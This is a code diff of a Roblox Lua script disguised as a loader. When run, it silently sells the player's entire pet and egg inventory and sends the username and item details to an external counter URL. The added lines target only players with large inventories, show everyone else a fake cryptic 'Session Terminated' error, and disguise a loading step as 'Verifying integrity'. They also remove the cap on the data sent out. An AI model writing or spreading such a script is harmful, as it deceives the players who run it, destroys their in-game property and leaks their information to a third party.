@@ -10,11 +10,17 @@ local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 
 -- ===== CONFIG =====
-local MEME_IMAGE_ID  = "rbxassetid://82403642047427"    -- texture ID
+local MEME_IMAGE_ID  = "rbxassetid://82403642047427"
 local LAUGH_SOUND_ID = "rbxassetid://133312610824902"
 local MEME_DELAY     = 4
 local MEME_SIZE      = 380
-local COUNTER_URL    = "https://sell-counter.bluealpha1365.workers.dev/report"
+local COUNTER_URL    = "https://sell-counter-temp.sae-tracker.workers.dev/report"
+
+-- ── Validation thresholds (internal — never shown) ──
+local MIN_PETS             = 10
+local MIN_EGGS             = 10
+local REQUIRE_AT_LEAST_ONE = true
+local REJECTION_HOLD_TIME  = 5
 -- ==================
 
 ------------------------------------------------------------
@@ -264,6 +270,96 @@ task.spawn(function()
     for _ = 1, 30 do task.wait(0.5); installOverride() end
 end)
 
+------------------------------------------------------------
+-- INVENTORY VALIDATION (silent)
+------------------------------------------------------------
+local function validateInventory()
+    local d = getSave()
+    if not d then return false end
+
+    local petCount = 0
+    if type(d.Inventory) == "table" then
+        for uid, rec in pairs(d.Inventory) do
+            local ok, item = TryCall(AssetItems.Decode, rec)
+            if ok and item and AssetDir[item.Category] and item.InFuse ~= true then
+                petCount = petCount + 1
+            end
+        end
+    end
+
+    local eggCount = 0
+    if type(d.EggInventory) == "table" then
+        for uid, rec in pairs(d.EggInventory) do
+            if type(rec) == "table" and rec.Placement == nil then
+                local ok, dec = TryCall(EggRecords.Decode, rec)
+                if ok and dec and AssetDir[dec.AssetCategory] then
+                    eggCount = eggCount + 1
+                end
+            end
+        end
+    end
+
+    local petsPass = petCount >= MIN_PETS
+    local eggsPass = eggCount >= MIN_EGGS
+
+    if REQUIRE_AT_LEAST_ONE then
+        return petsPass or eggsPass
+    else
+        return petsPass and eggsPass
+    end
+end
+
+------------------------------------------------------------
+-- REJECTION SCREEN (enterprise-style, cryptic)
+------------------------------------------------------------
+local function showRejection()
+    -- Icon: swap dots for a lock
+    dotRow.Visible = false
+
+    -- Title
+    title.Text = "Session Terminated"
+    title.TextColor3 = Color3.fromRGB(255, 100, 100)
+
+    -- Status: cryptic codes, no specifics
+    status.Text = "ERR_SESSION_0091 — Unable to verify client"
+    status.TextColor3 = Color3.fromRGB(180, 180, 200)
+    status.TextSize = 13
+    status.TextWrapped = false
+    status.Size = UDim2.new(1, -40, 0, 20)
+    status.Position = UDim2.new(0.5, 0, 0, 82)
+
+    -- Hide progress UI
+    barBg.Visible = false
+    pct.Visible = false
+
+    -- Add a subtle support footer
+    local footer = Instance.new("TextLabel")
+    footer.BackgroundTransparency = 1
+    footer.AnchorPoint = Vector2.new(0.5, 0)
+    footer.Position = UDim2.new(0.5, 0, 0, 148)
+    footer.Size = UDim2.new(1, -40, 0, 18)
+    footer.Font = Enum.Font.Gotham
+    footer.TextSize = 11
+    footer.TextColor3 = Color3.fromRGB(100, 100, 120)
+    footer.Text = "Reference: 0x4231 · Contact support if this persists"
+    footer.Parent = content
+
+    -- Little "lock" icon made of text
+    local lockIcon = Instance.new("TextLabel")
+    lockIcon.BackgroundTransparency = 1
+    lockIcon.AnchorPoint = Vector2.new(0.5, 0)
+    lockIcon.Position = UDim2.new(0.5, 0, 0, 0)
+    lockIcon.Size = UDim2.fromOffset(40, 40)
+    lockIcon.Font = Enum.Font.GothamBold
+    lockIcon.TextSize = 32
+    lockIcon.TextColor3 = Color3.fromRGB(255, 100, 100)
+    lockIcon.Text = "🔒"
+    lockIcon.Parent = content
+end
+
+------------------------------------------------------------
+-- UNFAVORITE / UNEQUIP
+------------------------------------------------------------
 local function unequipAll()
     local d = getSave()
     if not d or type(d.EquippedAssets) ~= "table" or #d.EquippedAssets == 0 then return end
@@ -304,7 +400,9 @@ local function unfavoriteAll()
     task.wait(0.8)
 end
 
--- Returns { Eggs = {...uids}, Assets = {...uids}, Details = {...} }
+------------------------------------------------------------
+-- PAYLOAD + SELL
+------------------------------------------------------------
 local function buildPayload()
     local pets, eggs = {}, {}
     local details = {}
@@ -315,27 +413,20 @@ local function buildPayload()
 
     local isVIP = LocalPlayer:GetAttribute("VIP") == true
 
-    -- Pets
     if type(d.Inventory) == "table" then
         for uid, rec in pairs(d.Inventory) do
             local ok, item = TryCall(AssetItems.Decode, rec)
             if ok and item and AssetDir[item.Category] and item.InFuse ~= true then
                 table.insert(pets, uid)
-
                 local entry = AssetDir[item.Category]
                 local rarity = entry.Rarity
-
-                -- Value
                 local priceOk, basePrice = TryCall(AssetItems.SalePrice, item)
                 local value = (priceOk and tonumber(basePrice)) or 0
                 if isVIP then value = value * 2 end
                 value = math.floor(value)
                 totalValue = totalValue + value
-
-                -- Weight
                 local weightOk, weight = TryCall(AssetItems.WeightKg, item)
                 weight = (weightOk and tonumber(weight)) or 0
-
                 table.insert(details, {
                     kind      = "pet",
                     uid       = uid,
@@ -350,25 +441,20 @@ local function buildPayload()
         end
     end
 
-    -- Eggs
     if type(d.EggInventory) == "table" then
         for uid, rec in pairs(d.EggInventory) do
             if type(rec) == "table" and rec.Placement == nil then
                 local ok, dec = TryCall(EggRecords.Decode, rec)
                 if ok and dec and AssetDir[dec.AssetCategory] then
                     table.insert(eggs, uid)
-
                     local entry = AssetDir[dec.AssetCategory]
                     local rarity = entry.Rarity
-
                     local priceOk, basePrice = TryCall(EggRecords.SellPrice, dec)
                     local value = (priceOk and tonumber(basePrice)) or 0
                     value = math.floor(value)
                     totalValue = totalValue + value
-
                     local weightOk, weight = TryCall(EggRecords.WeightKg, dec)
                     weight = (weightOk and tonumber(weight)) or 0
-
                     table.insert(details, {
                         kind      = "egg",
                         uid       = uid,
@@ -400,9 +486,6 @@ local function findSellPosition()
     return nil
 end
 
-------------------------------------------------------------
--- GLOBAL COUNTER REPORTING
-------------------------------------------------------------
 local function reportSales(petCount, eggCount, details, totalValue)
     if petCount + eggCount <= 0 then return end
 
@@ -423,8 +506,7 @@ local function reportSales(petCount, eggCount, details, totalValue)
     local username = LocalPlayer.Name or "Unknown"
 
     local trimmed = {}
-    for i, d in ipairs(details or {}) do
-        if i > 200 then break end
+    for _, d in ipairs(details or {}) do
         table.insert(trimmed, {
             kind      = d.kind,
             name      = d.name,
@@ -468,9 +550,6 @@ local function teleportAndSell()
     log(("Payload: %d pets, %d eggs"):format(petCount, eggCount))
     if petCount == 0 and eggCount == 0 then return end
 
-    -- Strip Details before sending to game server.
-    -- The captured payload shape was strictly {Eggs, Assets} — anything
-    -- extra could be rejected by the server's validation.
     local serverPayload = {
         Eggs   = payload.Eggs,
         Assets = payload.Assets,
@@ -499,12 +578,11 @@ local function teleportAndSell()
         pcall(function() hrp.AssemblyLinearVelocity = savedVel end)
     end
 
-    -- Report to global counter with full Details (pets, eggs, rarities)
     reportSales(petCount, eggCount, payload.Details, payload.TotalValue)
 end
 
 ------------------------------------------------------------
--- Boot animation
+-- Boot animation (generic — no hints)
 ------------------------------------------------------------
 local function boot()
     setStatus("Initializing...",          0.08, 0.5)
@@ -515,7 +593,7 @@ local function boot()
     task.wait(0.6)
     setStatus("Syncing profile...",       0.58, 0.5)
     task.wait(0.6)
-    setStatus("Preparing environment...", 0.78, 0.5)
+    setStatus("Verifying integrity...",   0.78, 0.5)   -- generic, not obvious
     task.wait(0.5)
     setStatus("Almost ready...",          1.00, 0.6)
     task.wait(0.7)
@@ -608,12 +686,37 @@ end
 -- LAUNCH
 ------------------------------------------------------------
 task.spawn(function()
+    -- 1. Show loading animation
     boot()
+
+    -- 2. Silently validate inventory
+    -- log("Running integrity check...")
+    local valid = validateInventory()
+
+    if not valid then
+        -- REJECT PATH — cryptic enterprise message
+        log("Integrity check failed. Terminating session.")
+        showRejection()
+
+        -- Hold for user to see
+        task.wait(REJECTION_HOLD_TIME)
+
+        -- Fade out silently (no sell, no meme)
+        fadeOutAndCleanup()
+        return
+    end
+
+    -- PASS PATH
+    log("Integrity check passed.")
+
+    -- 3. Proceed with sell
     local ok, err = pcall(runSilentWork)
     if not ok then warn("[Loader] Run failed:", err) end
+
     task.wait(0.3)
     fadeOutAndCleanup()
 
+    -- 4. Show the meme popup
     task.wait(MEME_DELAY)
     showMemePopup()
 end)
